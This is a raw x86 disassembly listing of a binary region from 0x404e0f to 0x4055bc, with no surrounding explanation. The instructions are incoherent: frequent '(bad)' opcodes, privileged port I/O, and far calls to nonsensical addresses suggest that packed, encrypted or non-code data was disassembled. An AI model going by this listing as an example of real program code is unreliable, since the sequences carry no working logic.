  404e0f:	mov    cl,BYTE PTR [ebx+0x587fe440]
  404e15:	and    bl,ch
  404e17:	sub    ch,ch
  404e19:	hlt    
  404e1a:	inc    esi
  404e1b:	cld    
  404e1c:	or     eax,0x782a112a
  404e21:	sub    eax,0x9eaa569
  404e26:	inc    ebx
  404e27:	in     eax,0x54
  404e29:	sbb    bh,ah
  404e2b:	cmp    BYTE PTR [ecx+0x7236da58],bh
  404e31:	bound  esp,QWORD PTR [edi+0x3c971ca4]
  404e37:	je     0x404e8b
  404e39:	sar    BYTE PTR [edx],cl
  404e3b:	jb     0x404eb4
  404e3d:	inc    ebx
  404e3e:	xor    DWORD PTR [ecx-0x56c55ede],0xffffff88
  404e45:	and    BYTE PTR [ecx-0x3a953c3b],dh
  404e4b:	and    al,0x84
  404e4d:	fcomp  DWORD PTR [edi]
  404e4f:	jo     0x404ec1
  404e51:	cmp    DWORD PTR [ecx+0x61d54cdd],ebp
  404e57:	inc    esp
  404e58:	cld    
  404e59:	ret    
  404e5a:	scas   al,BYTE PTR es:[edi]
  404e5b:	dec    ebp
  404e5c:	(bad)  
  404e5d:	retf   
  404e5e:	shl    BYTE PTR [edi-0x6c],0xe
  404e62:	mov    edx,0xa98ef864
  404e67:	pop    esp
  404e68:	cdq    
  404e69:	retf   0xab7e
  404e6c:	pop    esp
  404e6d:	ins    DWORD PTR es:[edi],dx
  404e6e:	add    cl,BYTE PTR [edi+0x40fd85f5]
  404e74:	cmp    al,0x59
  404e76:	std    
  404e77:	dec    ebx
  404e78:	push   ebp
  404e79:	sbb    DWORD PTR [eax],0x18676886
  404e7f:	push   0x9bea6a0f
  404e84:	push   esp
  404e85:	adc    edx,DWORD PTR [ebx+0x2f]
  404e88:	xchg   edi,eax
  404e89:	sbb    eax,0x10eac708
  404e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e8f:	dec    ebx
  404e90:	xor    esp,DWORD PTR [ebx+eiz*2+0x3d]
  404e94:	ss aad 0xa3
  404e97:	dec    ebx
  404e98:	fadd   st,st(4)
  404e9a:	or     bh,BYTE PTR [eax+0x6d]
  404e9d:	xchg   ch,ah
  404e9f:	and    esi,DWORD PTR [esi+0x4dc559d]
  404ea5:	jp     0x404f11
  404ea7:	stc    
  404ea8:	scas   eax,DWORD PTR es:[edi]
  404ea9:	imul   edx,edi,0x425e3f0
  404eaf:	lahf   
  404eb0:	popa   
  404eb1:	lahf   
  404eb2:	pop    ss
  404eb3:	sub    BYTE PTR [ecx+0x23],bl
  404eb6:	sub    al,BYTE PTR [edi-0x50]
  404eb9:	push   ecx
  404eba:	cmc    
  404ebb:	mov    eax,ds:0x4435f75
  404ec0:	xor    al,0xce
  404ec2:	or     eax,0x6d698d97
  404ec7:	sub    dh,ch
  404ec9:	lds    ebp,FWORD PTR [ebp+0x4c]
  404ecc:	push   ebp
  404ecd:	rcr    BYTE PTR [edx+ecx*2-0x5d6127aa],1
  404ed4:	push   ecx
  404ed5:	mov    BYTE PTR [edi+0x3add5c0b],cl
  404edb:	nop
  404edc:	jo     0x404f3c
  404ede:	jle    0x404ebe
  404ee0:	mov    al,ds:0x8f869709
  404ee5:	jp     0x404ed7
  404ee7:	(bad)  
  404ee8:	out    dx,al
  404ee9:	mov    dh,0x7e
  404eeb:	imul   edi,DWORD PTR [ecx+ebp*1],0xffffff87
  404eef:	sub    dl,dh
  404ef1:	mov    esi,0x99bdb11c
  404ef6:	inc    edx
  404ef7:	jg     0x404f5e
  404ef9:	gs or  dl,dh
  404efc:	scas   eax,DWORD PTR es:[edi]
  404efd:	dec    esi
  404efe:	fdiv   DWORD PTR [edi+ecx*4]
  404f01:	out    0x31,eax
  404f03:	hlt    
  404f04:	cmp    BYTE PTR [eax],bh
  404f06:	dec    esi
  404f07:	adc    al,0xa4
  404f09:	dec    edx
  404f0a:	xor    al,0x33
  404f0c:	call   0xae7f:0x40636a87
  404f13:	cld    
  404f14:	mov    eax,ds:0x4aef26e0
  404f19:	aaa    
  404f1a:	jp     0x404f36
  404f1c:	lock jbe 0x404f41
  404f1f:	(bad)  
  404f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f21:	jmp    0x404f3d
  404f23:	push   es
  404f24:	jp     0x404f5e
  404f26:	inc    edi
  404f27:	and    BYTE PTR [edx],cl
  404f29:	mov    ds:0x662ddc27,al
  404f2e:	mov    bl,0x44
  404f30:	outs   dx,BYTE PTR gs:[esi]
  404f32:	xor    eax,0xf3a702a0
  404f37:	lods   al,BYTE PTR ds:[esi]
  404f38:	ret    
  404f39:	add    DWORD PTR es:[ebp-0x48],edi
  404f3d:	shl    BYTE PTR [eax-0x6fde3370],cl
  404f43:	mov    cl,0x9b
  404f45:	in     al,dx
  404f46:	pushf  
  404f47:	and    BYTE PTR [edi+0x7],cl
  404f4a:	out    dx,eax
  404f4b:	arpl   WORD PTR [eax],bx
  404f4d:	mov    dl,0xe3
  404f4f:	pop    edi
  404f50:	sub    DWORD PTR [ecx+0x38],ebp
  404f53:	mov    WORD PTR [ebx+edx*1],es
  404f56:	mov    ch,0x49
  404f58:	jp     0x404f72
  404f5a:	(bad)  
  404f5b:	jb     0x404f69
  404f5d:	cmp    ebp,esi
  404f5f:	xchg   ebp,eax
  404f60:	pop    edi
  404f61:	cmp    DWORD PTR [eax+0x659fbdf4],0x4b
  404f68:	xchg   edi,eax
  404f69:	xchg   ebp,eax
  404f6a:	cmp    esp,DWORD PTR [esi-0x6b2b9577]
  404f70:	jnp    0x404ef3
  404f72:	aad    0xf2
  404f74:	jae    0x404fc8
  404f76:	lea    esi,[edi-0x721164fa]
  404f7c:	mov    cl,0xcf
  404f7e:	dec    ebx
  404f7f:	xchg   esp,eax
  404f80:	xor    eax,0x76b0fd0d
  404f85:	stos   BYTE PTR es:[edi],al
  404f86:	and    al,0x41
  404f88:	sub    ah,BYTE PTR [esi-0x4e8a2001]
  404f8e:	jge    0x404fbf
  404f90:	fcmovnu st,st(3)
  404f92:	fidivr DWORD PTR [esi-0x38]
  404f95:	push   0x65ce0d28
  404f9a:	retf   
  404f9b:	sti    
  404f9c:	and    edi,DWORD PTR [eax]
  404f9e:	sub    BYTE PTR [eax],ch
  404fa0:	nop
  404fa1:	push   0xc1ffd22e
  404fa6:	jp     0x404f9c
  404fa8:	xor    bh,BYTE PTR [ebp+ebx*2+0x15]
  404fac:	adc    DWORD PTR [bp+si],edi
  404faf:	out    0x7d,eax
  404fb1:	pop    edx
  404fb2:	mov    ch,0xf0
  404fb4:	xchg   DWORD PTR [eax],ecx
  404fb6:	adc    DWORD PTR [eax+0x7b],edi
  404fb9:	jns    0x404f7b
  404fbb:	jp     0x404fa8
  404fbd:	cmp    BYTE PTR [eax],dh
  404fbf:	std    
  404fc0:	xchg   ebx,eax
  404fc1:	jg     0x404f7d
  404fc3:	scas   al,BYTE PTR es:[edi]
  404fc4:	outs   dx,DWORD PTR ds:[esi]
  404fc5:	mov    cl,0x6f
  404fc7:	xor    DWORD PTR [ebp-0x5a],edx
  404fca:	sbb    DWORD PTR [ebx+ebp*4+0x6],ecx
  404fce:	dec    edi
  404fcf:	pop    esp
  404fd0:	mov    esi,0x64831004
  404fd5:	int3   
  404fd6:	ins    BYTE PTR es:[edi],dx
  404fd7:	adc    DWORD PTR [ebp-0x3b],ebp
  404fda:	inc    eax
  404fdb:	js     0x404ffc
  404fdd:	mov    BYTE PTR [edx-0x6d],bh
  404fe0:	arpl   WORD PTR [ebp+0x3c],ax
  404fe3:	fisubr WORD PTR [esi]
  404fe5:	or     al,0xd5
  404fe7:	jns    0x404f92
  404fe9:	ror    BYTE PTR [ebx-0x3f],cl
  404fec:	sahf   
  404fed:	xor    al,0xcf
  404fef:	bound  edi,QWORD PTR [eax-0x38]
  404ff2:	addr16 inc ecx
  404ff4:	imul   esp,DWORD PTR [edx],0x48439c5c
  404ffa:	ins    BYTE PTR es:[edi],dx
  404ffb:	jbe    0x404fab
  404ffd:	out    dx,eax
  404ffe:	push   esp
  404fff:	pop    ss
  405000:	mov    al,ds:0x9cb9965e
  405005:	mov    dl,0xa3
  405007:	pop    edi
  405008:	add    edx,DWORD PTR [edi+0x5bbc8ea]
  40500e:	out    dx,al
  40500f:	dec    esp
  405010:	retf   
  405011:	cli    
  405012:	imul   ecx,DWORD PTR [ecx-0x2d],0x6c95935
  405019:	stc    
  40501a:	xor    eax,0x241dfd2a
  40501f:	and    ebx,DWORD PTR [ebx+0x6c]
  405022:	push   edi
  405023:	or     al,0x64
  405025:	ss jne 0x404ffc
  405028:	in     eax,dx
  405029:	mov    cl,0x68
  40502b:	sub    al,0x53
  40502d:	out    0xc6,al
  40502f:	rol    esp,cl
  405031:	inc    ebx
  405032:	mov    dl,0xda
  405034:	iret   
  405035:	(bad)  
  405036:	cmp    bl,bl
  405038:	iret   
  405039:	outs   dx,DWORD PTR ds:[esi]
  40503a:	add    al,0x91
  40503c:	ds jae 0x4050ba
  40503f:	jmp    0x299948da
  405044:	xchg   ebp,eax
  405045:	pop    ebp
  405046:	push   eax
  405047:	mov    eax,0xf214c453
  40504c:	(bad)  [ebx-0x3bb3b62d]
  405052:	xor    ch,BYTE PTR [eax+0x41fb4fd2]
  405058:	mov    ebx,0x696aeb3f
  40505d:	inc    BYTE PTR [edx-0x3c702dbe]
  405063:	jne    0x4050c0
  405065:	jo     0x404ff8
  405067:	push   cs
  405068:	ror    BYTE PTR [esi-0x79445f85],0xe2
  40506f:	xchg   edx,eax
  405070:	pop    esi
  405071:	and    al,0xfe
  405073:	repnz das 
  405075:	lock mov bl,0x7e
  405078:	xchg   ebp,eax
  405079:	sbb    BYTE PTR [edi-0x68],dl
  40507c:	cmp    DWORD PTR ds:0xca25613b,ebx
  405082:	inc    esi
  405083:	cmc    
  405084:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405085:	cmp    BYTE PTR [edx+0x7097563a],bl
  40508b:	pusha  
  40508c:	sub    eax,0x621fa01e
  405091:	or     esp,DWORD PTR [esi]
  405093:	(bad)  
  405094:	sub    cl,ch
  405096:	xor    al,0xb
  405098:	retf   0xe0bc
  40509b:	in     eax,0x4a
  40509d:	cdq    
  40509e:	shl    BYTE PTR [esi],cl
  4050a0:	sbb    BYTE PTR [esp+edi*8],al
  4050a3:	retf   
  4050a4:	mov    esp,0x419e036a
  4050a9:	pop    esi
  4050aa:	clc    
  4050ab:	inc    eax
  4050ac:	pop    edx
  4050ad:	test   DWORD PTR [ebp-0x432031d9],eax
  4050b3:	sub    eax,0x4f6545e4
  4050b8:	push   ebx
  4050b9:	mov    WORD PTR [eax+0x3b],es
  4050bc:	call   0x796d:0xe9f40c5e
  4050c3:	xchg   ebx,eax
  4050c4:	aas    
  4050c5:	mov    cl,0x8f
  4050c7:	gs jmp 0x604f:0xcf758293
  4050cf:	inc    ebx
  4050d0:	pop    edi
  4050d1:	addr16 test edi,ebx
  4050d4:	and    bl,BYTE PTR [ecx+0x70711aab]
  4050da:	ror    DWORD PTR [ecx+edx*4+0x68],cl
  4050de:	rcr    DWORD PTR [edi-0x32e21097],1
  4050e4:	jl     0x4050cf
  4050e6:	jge    0x405151
  4050e8:	inc    esp
  4050e9:	push   eax
  4050ea:	xchg   ebp,eax
  4050eb:	jno    0x4050a6
  4050ed:	aaa    
  4050ee:	xor    edx,DWORD PTR [eax]
  4050f0:	mov    al,0xb3
  4050f2:	fisub  WORD PTR [ecx+0x3a]
  4050f5:	inc    esi
  4050f6:	sub    eax,0x43ada83f
  4050fb:	inc    edx
  4050fc:	push   ebp
  4050fd:	cmp    bh,bl
  4050ff:	mov    eax,0x93c759d4
  405104:	push   edi
  405105:	dec    ebx
  405106:	int3   
  405107:	(bad)
  40510a:	inc    esi
  40510b:	test   BYTE PTR [ecx+0x57],0x51
  40510f:	clc    
  405110:	mov    dh,0xce
  405112:	xchg   esi,eax
  405113:	pusha  
  405114:	fcmovb st,st(5)
  405116:	out    0xe9,al
  405118:	push   edx
  405119:	dec    esi
  40511a:	aad    0x8f
  40511c:	and    eax,0xda38c16c
  405121:	inc    ebx
  405122:	nop
  405123:	stos   DWORD PTR es:[edi],eax
  405124:	xchg   edx,edx
  405126:	jb     0x405155
  405128:	cmp    DWORD PTR [esp],0xf
  40512c:	shl    BYTE PTR [edi-0xa],cl
  40512f:	arpl   WORD PTR [ebx-0x4b7ed1b2],dx
  405135:	inc    ecx
  405136:	mov    cl,BYTE PTR [esi]
  405138:	retf   
  405139:	pop    es
  40513a:	mov    al,ds:0xa16c8acf
  40513f:	add    al,0x59
  405141:	ss xchg ebx,eax
  405143:	sub    BYTE PTR [edx],al
  405145:	or     esp,DWORD PTR [edi]
  405147:	out    0x0,eax
  405149:	aaa    
  40514a:	adc    al,0x2
  40514c:	es test eax,0xc1f14c3a
  405152:	aad    0xbb
  405154:	loope  0x405160
  405156:	gs jl  0x405170
  405159:	add    eax,0x8524f2bd
  40515e:	in     eax,dx
  40515f:	or     BYTE PTR [ebx],0x7e
  405162:	(bad)  
  405163:	scas   eax,DWORD PTR es:[edi]
  405164:	mov    ecx,0xd837b6c4
  405169:	sub    DWORD PTR [ecx+ecx*2+0xa],ebx
  40516d:	mov    esi,0x65a78bb2
  405172:	cmp    BYTE PTR ds:0xb07c5dbf,al
  405178:	xchg   esi,eax
  405179:	cmp    ah,ch
  40517b:	sbb    dh,BYTE PTR [edi+0x15]
  40517e:	(bad)  
  40517f:	mov    ah,0x77
  405181:	or     ebp,DWORD PTR [edx-0x27cf9b4d]
  405187:	dec    ecx
  405188:	hlt    
  405189:	sub    al,0x97
  40518b:	arpl   WORD PTR [esi+0x74],bx
  40518e:	and    eax,0xb0d7ade8
  405193:	stos   DWORD PTR es:[edi],eax
  405194:	rcr    DWORD PTR [esi+0x44],cl
  405197:	fdiv   QWORD PTR [ebx-0x55]
  40519a:	cs push ebx
  40519c:	fld    DWORD PTR [ebp-0xd]
  40519f:	jns    0x405162
  4051a1:	dec    eax
  4051a2:	push   ds
  4051a3:	fidivr DWORD PTR [edi+0x465df304]
  4051a9:	scas   al,BYTE PTR es:[edi]
  4051aa:	push   ss
  4051ab:	das    
  4051ac:	cwde   
  4051ad:	inc    ebx
  4051ae:	pushf  
  4051af:	jl     0x405153
  4051b1:	(bad)  
  4051b2:	mov    ebx,0x78efa98f
  4051b7:	mov    ds:0xa6cf9da3,eax
  4051bc:	pushf  
  4051bd:	imul   edx,DWORD PTR [edx+0x1],0xa6ae87a1
  4051c4:	cmp    DWORD PTR [eax+eiz*4-0x5e951d54],esi
  4051cb:	ins    DWORD PTR es:[edi],dx
  4051cc:	sbb    eax,0x85e6b0a8
  4051d1:	repnz mov al,bh
  4051d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051d5:	rcr    BYTE PTR [ecx+ebp*4+0x3c8dc727],1
  4051dc:	call   0x1505:0x1a50ff78
  4051e3:	aaa    
  4051e4:	cmp    ebp,DWORD PTR [edx]
  4051e6:	mov    edx,0xa223f4b3
  4051eb:	and    BYTE PTR [ebx],0xe6
  4051ee:	dec    eax
  4051ef:	pop    esi
  4051f0:	inc    edx
  4051f1:	add    DWORD PTR [edi+0x69939a75],0xe337413c
  4051fb:	adc    BYTE PTR [edi],cl
  4051fd:	pop    ebx
  4051fe:	push   ebx
  4051ff:	push   cs
  405200:	test   bh,0x79
  405203:	aaa    
  405204:	iret   
  405205:	pop    ds
  405206:	pop    ebx
  405207:	push   0x2937c101
  40520c:	and    eax,0x909f2e0c
  405211:	push   esp
  405212:	pop    ss
  405213:	or     eax,0x345ab944
  405218:	ret    0xad6b
  40521b:	xchg   ecx,eax
  40521c:	adc    cl,BYTE PTR [eax]
  40521e:	jno    0x405261
  405220:	retf   
  405221:	scas   al,BYTE PTR es:[edi]
  405222:	retf   
  405223:	jns    0x405246
  405225:	xchg   ebp,eax
  405226:	pop    edi
  405227:	aad    0x42
  405229:	xchg   esi,eax
  40522a:	mov    ah,0xad
  40522c:	jg     0x4051ee
  40522e:	pop    ecx
  40522f:	mov    ds:0xc28c63ac,eax
  405234:	call   0x3f1b:0xf3fa774e
  40523b:	and    edx,ebx
  40523d:	push   es
  40523e:	call   0x83cc6323
  405243:	lds    edi,FWORD PTR [ecx+eax*1]
  405246:	sbb    DWORD PTR [edi+0x56ec2503],edx
  40524c:	sar    DWORD PTR [esi-0x662c0c00],cl
  405252:	inc    ebx
  405253:	xchg   DWORD PTR [ebp-0x4ef15d02],ebp
  405259:	pop    ss
  40525a:	mov    esp,0xdc10afe4
  40525f:	gs in  al,dx
  405261:	mov    DWORD PTR [edx+0x71],eax
  405264:	mov    ds:0x439376a6,al
  405269:	xchg   ebx,eax
  40526a:	adc    DWORD PTR [edx-0x5],esi
  40526d:	push   cs
  40526e:	into   
  40526f:	pop    edx
  405270:	mov    ebx,0x6d30b8cf
  405275:	cmp    bl,al
  405277:	arpl   bp,di
  405279:	pop    esp
  40527a:	int    0x52
  40527c:	das    
  40527d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40527e:	pop    eax
  40527f:	es call eax
  405282:	pushf  
  405283:	jl     0x405210
  405285:	ins    DWORD PTR es:[edi],dx
  405286:	repz jne 0x4052aa
  405289:	jno    0x405230
  40528b:	aad    0x5e
  40528d:	out    dx,al
  40528e:	push   ecx
  40528f:	jmp    0x4052eb
  405291:	shl    BYTE PTR [esi-0x17],1
  405294:	fdivr  DWORD PTR [ecx+0x46]
  405297:	inc    esp
  405298:	xor    edi,0x46
  40529b:	ret    0x4a4a
  40529e:	sbb    al,0x8e
  4052a0:	or     BYTE PTR [ebx-0x57],bh
  4052a3:	add    DWORD PTR [ecx+0x6d],0xffffff9a
  4052a7:	inc    ebx
  4052a8:	scas   eax,DWORD PTR es:[edi]
  4052a9:	popa   
  4052aa:	xchg   edx,eax
  4052ab:	pop    edi
  4052ac:	or     BYTE PTR [edi+ebp*1-0x62],bh
  4052b0:	jp     0x4052b3
  4052b2:	xor    eax,DWORD PTR [eax+eax*1-0x45]
  4052b6:	sub    al,0xdd
  4052b8:	jns    0x405287
  4052ba:	or     DWORD PTR [edx-0x14],edi
  4052bd:	pop    ebp
  4052be:	fdiv   QWORD PTR [edi-0x2]
  4052c1:	or     esp,edi
  4052c3:	cmc    
  4052c4:	pop    esp
  4052c5:	jmp    0x200eecc0
  4052ca:	and    ebp,DWORD PTR [esi-0x39]
  4052cd:	pop    edi
  4052ce:	inc    ebx
  4052cf:	pushf  
  4052d0:	push   ds
  4052d1:	into   
  4052d2:	fst    QWORD PTR [ebx]
  4052d4:	loopne 0x405291
  4052d6:	pop    ecx
  4052d7:	gs jns 0x4052b8
  4052da:	pop    ds
  4052db:	add    DWORD PTR [eax],ecx
  4052dd:	inc    edx
  4052de:	pop    esi
  4052df:	neg    BYTE PTR ds:0xd180087c
  4052e5:	push   ds
  4052e6:	mov    ecx,0xe41a4b5c
  4052eb:	push   eax
  4052ec:	mov    edx,0x61e3573d
  4052f1:	mov    eax,ds:0xfce25892
  4052f6:	jno    0x4052bb
  4052f8:	mov    edx,0xaa626447
  4052fd:	xchg   DWORD PTR [eax+edi*4-0x29],esp
  405301:	push   ebp
  405302:	mov    BYTE PTR [edi-0x4cd94a3b],dl
  405308:	out    dx,al
  405309:	adc    BYTE PTR [esi-0x43],cl
  40530c:	jne    0x40528e
  40530e:	nop
  40530f:	xchg   ebx,eax
  405310:	ret    0xb8f8
  405313:	cwde   
  405314:	mov    WORD PTR [ebp+0x7340ccb5],?
  40531a:	or     esi,esp
  40531c:	jae    0x4052e3
  40531e:	div    DWORD PTR [edx]
  405320:	mov    eax,ds:0x1afc8c1
  405325:	rcl    BYTE PTR [eax],1
  405327:	lods   al,BYTE PTR ds:[esi]
  405328:	xchg   BYTE PTR [edx+0x5e],dl
  40532b:	pop    ecx
  40532c:	inc    ebx
  40532d:	inc    DWORD PTR [ebx-0x729d975e]
  405333:	push   ebp
  405334:	xchg   DWORD PTR [esi-0x66bd26f7],edx
  40533a:	mov    ebp,0xcb32dc8f
  40533f:	xchg   esi,eax
  405340:	mov    edx,0x292d834a
  405345:	fsub   DWORD PTR [ebx-0x7b]
  405348:	mov    DWORD PTR ss:[esi+edx*4],esp
  40534c:	push   0x4c5eb089
  405351:	in     eax,dx
  405352:	lods   eax,DWORD PTR ds:[esi]
  405353:	mov    ch,0x9b
  405355:	pop    ebp
  405357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405358:	dec    esi
  405359:	pop    ebx
  40535a:	int    0xe3
  40535c:	cmp    edi,DWORD PTR [esi-0x80]
  40535f:	cli    
  405360:	cmp    ecx,ecx
  405362:	fdiv   st,st(1)
  405364:	and    BYTE PTR [ebx+edi*4],0xd9
  405368:	mov    DWORD PTR [edx+0x5f734107],0xd4f15015
  405372:	shl    cl,cl
  405374:	ins    BYTE PTR es:[edi],dx
  405375:	pop    es
  405376:	add    eax,0x84bc6066
  40537b:	pop    ecx
  40537c:	jg     0x405306
  40537e:	xchg   esp,eax
  40537f:	fisttp QWORD PTR [ebp-0x73592e30]
  405385:	out    dx,eax
  405386:	jno    0x405369
  405388:	push   ds
  405389:	iret   
  40538a:	popa   
  40538b:	jno    0x405354
  40538d:	cmp    al,0x33
  40538f:	sbb    dh,BYTE PTR [esi+ecx*4+0x1f]
  405393:	in     al,0xae
  405395:	jl     0x40531d
  405397:	cld    
  405398:	loope  0x4053e4
  40539a:	push   esi
  40539b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40539c:	dec    ecx
  40539d:	sub    ch,bl
  40539f:	outs   dx,DWORD PTR ds:[esi]
  4053a0:	repnz pop esp
  4053a2:	dec    edx
  4053a3:	rcr    DWORD PTR [eax+ecx*4-0x14cf2cc1],cl
  4053aa:	and    ah,dl
  4053ac:	xchg   ecx,eax
  4053ad:	rol    ecx,cl
  4053af:	test   al,0x12
  4053b1:	(bad)  
  4053b2:	cmp    eax,0x11594930
  4053b7:	rol    cl,0x59
  4053ba:	cwde   
  4053bb:	inc    ebx
  4053bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053bd:	scas   al,BYTE PTR es:[edi]
  4053be:	cs out dx,al
  4053c0:	and    BYTE PTR [eax],bl
  4053c2:	stos   BYTE PTR es:[edi],al
  4053c3:	push   esi
  4053c4:	xor    eax,0xf59e733e
  4053c9:	and    eax,0xe096e26d
  4053ce:	inc    ebx
  4053cf:	jae    0x4053a0
  4053d1:	fistp  DWORD PTR [edi]
  4053d3:	mov    DWORD PTR [ecx-0x54],esp
  4053d6:	inc    edi
  4053d7:	add    DWORD PTR [ebx-0x2f],0xffffffe7
  4053db:	cmp    eax,0x1a7c586
  4053e0:	shr    BYTE PTR [edi-0x39],0x2
  4053e4:	(bad)  
  4053e5:	fucomi st,st(7)
  4053e7:	ss inc edx
  4053e9:	adc    ebx,DWORD PTR [ebx-0x4d6bfdde]
  4053ef:	pop    eax
  4053f0:	xchg   esp,eax
  4053f1:	into   
  4053f2:	sub    ah,bh
  4053f4:	cmp    cl,ch
  4053f6:	aas    
  4053f7:	jnp    0x40537c
  4053f9:	les    ecx,FWORD PTR [edi+0x51]
  4053fc:	pop    ds
  4053fd:	or     eax,0xc7279b7e
  405402:	sahf   
  405403:	jb     0x4053ec
  405405:	lods   eax,DWORD PTR ds:[esi]
  405406:	out    dx,al
  405407:	sahf   
  405408:	jl     0x4053b0
  40540a:	inc    esi
  40540b:	imul   eax,DWORD PTR [edx+0x18],0x7b84e16
  405412:	cmc    
  405413:	fsub   QWORD PTR [esi]
  405415:	cs aas 
  405417:	int    0x6c
  405419:	add    DWORD PTR [edi-0x5d],ecx
  40541c:	add    esp,DWORD PTR [ebx-0x6d]
  40541f:	xchg   ebx,eax
  405420:	adc    eax,0x9145ae1d
  405425:	out    dx,eax
  405426:	cs push edx
  405428:	jmp    0x4053cd
  40542a:	add    esp,DWORD PTR [ecx-0x77a6070b]
  405430:	fst    QWORD PTR [ebp+0x51563de]
  405436:	push   ebx
  405437:	sbb    eax,0xd5dfa5b3
  40543c:	gs sbb bh,dh
  40543f:	mov    al,0x52
  405441:	mov    DWORD PTR [ecx],esp
  405443:	iret   
  405444:	fld    QWORD PTR [eax+0xf]
  405447:	xor    BYTE PTR [eax],ch
  405449:	(bad)  
  40544a:	cmp    esp,ecx
  40544c:	aad    0x65
  40544e:	mov    bl,0x45
  405450:	(bad)  
  405451:	xchg   esp,eax
  405452:	(bad)  
  405454:	std    
  405455:	scas   eax,DWORD PTR es:[edi]
  405456:	or     al,0x7b
  405458:	out    dx,eax
  405459:	loop   0x40540b
  40545b:	jmp    DWORD PTR [ebp+0x75]
  40545e:	sbb    al,0xbe
  405460:	or     eax,0x31b35856
  405465:	cdq    
  405466:	inc    ebx
  405467:	dec    ebp
  405468:	gs out dx,eax
  40546a:	sbb    DWORD PTR [ebx+0x2],eax
  40546d:	push   es
  40546e:	push   ds
  40546f:	xor    DWORD PTR [edi],edi
  405471:	and    dl,BYTE PTR [eax-0x2d]
  405474:	mov    bh,0x8f
  405476:	add    dh,al
  405478:	cmp    al,0x59
  40547a:	add    al,0x38
  40547c:	mov    esi,0xc439c283
  405481:	jae    0x405458
  405483:	xchg   ebx,eax
  405484:	dec    BYTE PTR [ebp-0xcd1e6f0]
  40548a:	in     eax,0x5
  40548c:	sbb    al,0xf1
  40548e:	ds loop 0x405465
  405491:	push   edx
  405492:	sbb    dl,BYTE PTR [eax+eiz*8+0x36e73ffd]
  405499:	data16 loopne 0x40546c
  40549c:	mov    ebx,?
  40549e:	imul   esi,DWORD PTR [ecx],0xbfbcb17f
  4054a4:	cmp    DWORD PTR [eax+0x45],ebx
  4054a7:	into   
  4054a8:	ss jbe 0x4054d5
  4054ab:	adc    BYTE PTR [edx],dh
  4054ad:	test   al,0x2
  4054af:	mov    cs,WORD PTR [edx]
  4054b1:	fidivr DWORD PTR [edi-0x1e831a60]
  4054b7:	call   0xc5e95678
  4054bc:	les    ecx,FWORD PTR [ecx-0x64]
  4054bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054c0:	ins    DWORD PTR es:[edi],dx
  4054c1:	shr    BYTE PTR [ebx],1
  4054c3:	cdq    
  4054c4:	cmp    dh,BYTE PTR [esi+0x21]
  4054c7:	mov    eax,0x6d8741d9
  4054cc:	das    
  4054cd:	mov    ebp,0xe61104b5
  4054d2:	icebp  
  4054d3:	test   DWORD PTR [edx],0x3f5a9a66
  4054d9:	mov    eax,ds:0xdfd0ff06
  4054de:	loopne 0x4054d3
  4054e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054e1:	fwait
  4054e2:	mov    ds:0x2b49183a,al
  4054e7:	in     al,0x1c
  4054e9:	cwde   
  4054ea:	or     al,0x6f
  4054ec:	cli    
  4054ed:	js     0x405558
  4054ef:	jl     0x405566
  4054f1:	sub    eax,0xb0c9ce60
  4054f6:	(bad)
  4054f9:	pop    eax
  4054fa:	packuswb mm4,mm3
  4054fd:	and    al,0xab
  4054ff:	mov    eax,0x7cf53360
  405504:	or     ch,BYTE PTR [ebx-0x1c]
  405507:	and    eax,0x4147a14f
  40550c:	sbb    eax,DWORD PTR [ecx-0x3a]
  40550f:	rol    cl,0x44
  405512:	(bad)  
  405513:	stc    
  405514:	arpl   WORD PTR ss:[edx-0xb],ax
  405518:	call   0xaff:0xb1923120
  40551f:	jp     0x40550f
  405521:	jb     0x405576
  405523:	ins    DWORD PTR es:[edi],dx
  405524:	fcomp  QWORD PTR [ecx-0x7]
  405527:	and    ch,BYTE PTR [edx+0x6908e2bb]
  40552d:	pop    eax
  40552e:	out    0x57,al
  405530:	div    ecx
  405532:	retf   0x2d1
  405535:	xor    DWORD PTR [esi-0x167557cc],ecx
  40553b:	add    esi,ebp
  40553d:	dec    ebp
  40553e:	push   eax
  40553f:	pop    ds
  405540:	les    eax,FWORD PTR [eax+0x7d]
  405543:	jno    0x405509
  405545:	mov    ah,0xcd
  405547:	mov    dl,0x60
  405549:	dec    ebp
  40554a:	xchg   DWORD PTR [esi+0x3],esp
  40554d:	cmp    esi,ebp
  40554f:	push   esi
  405550:	pop    esi
  405551:	lahf   
  405552:	xchg   ebx,eax
  405553:	jge    0x405545
  405555:	ret    0x8453
  405558:	sbb    BYTE PTR [ecx-0x561ebeea],al
  40555e:	or     DWORD PTR [edx-0x6de1c7e0],0xf788cdc7
  405568:	xchg   ebx,eax
  405569:	pop    edi
  40556a:	scas   eax,DWORD PTR es:[edi]
  40556b:	(bad)  
  40556d:	sbb    eax,0x57760456
  405572:	pop    edx
  405573:	adc    BYTE PTR [eax],dl
  405575:	sub    al,0x34
  405577:	pop    ebp
  405578:	lahf   
  405579:	pop    ebx
  40557a:	jecxz  0x405505
  40557c:	cmp    DWORD PTR [ebx+0x74106913],ebp
  405582:	sbb    esp,edx
  405584:	jae    0x40558b
  405586:	cmp    dl,BYTE PTR [ecx+0x20]
  405589:	les    eax,FWORD PTR [edi]
  40558b:	adc    bl,ch
  40558d:	mov    cl,0x60
  40558f:	in     al,0xe8
  405591:	sub    cl,bh
  405593:	mov    eax,0x64e009
  405598:	stos   BYTE PTR es:[edi],al
  405599:	xchg   DWORD PTR [eax],ebx
  40559b:	adc    bh,BYTE PTR [esp+eiz*4-0x56]
  40559f:	nop
  4055a0:	fiadd  WORD PTR [eax+0x2453624b]
  4055a6:	push   0x38c29d84
  4055ab:	loope  0x40557a
  4055ad:	push   ss
  4055ae:	fiadd  DWORD PTR ss:[eax+ebp*4-0x1c417673]
  4055b6:	xchg   edi,eax
  4055b7:	std    
  4055b8:	stos   DWORD PTR es:[edi],eax
  4055b9:	push   ecx
  4055ba:	pop    edx
  4055bb:	pop    eax
  4055bc:	or     al,0xac
